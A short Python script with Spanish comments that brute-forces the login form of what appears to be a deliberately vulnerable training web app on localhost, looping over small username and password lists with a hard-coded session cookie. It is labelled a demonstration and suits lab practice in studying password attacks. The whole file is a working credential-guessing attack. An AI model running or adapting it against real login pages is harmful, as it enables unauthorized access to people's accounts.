import requests

# Configuración base (ajusta el puerto si tu localhost lo requiere, ej: localhost:4280)
url = "http://localhost:4280/vulnerabilities/brute/"

# Cabeceras críticas: La cookie de sesión y el nivel de seguridad
cookies = {
    'PHPSESSID': '3a2224f6f0194eb7b699a1f5795d9077',
    'security': 'low'
}

# Diccionarios reducidos para la demostración
usuarios = ["admin", "test", "smithy", "user"]
passwords = ["123456", "password", "letmein", "abc123"]

print("Iniciando ataque de fuerza bruta con Python...")

for usuario in usuarios:
    for password in passwords:
        # Los parámetros que viajarán en la URL (método GET)
        parametros = {
            'username': usuario,
            'password': password,
            'Login': 'Login'
        }
        
        # Realizar la petición HTTP
        respuesta = requests.get(url, params=parametros, cookies=cookies)
        
        # Verificar si el login fue exitoso buscando la bandera de éxito
        if "Welcome to the password protected area" in respuesta.text:
            print(f"[+] ¡Éxito! Credenciales encontradas -> Usuario: {usuario} | Contraseña: {password}")

print("Ataque finalizado.")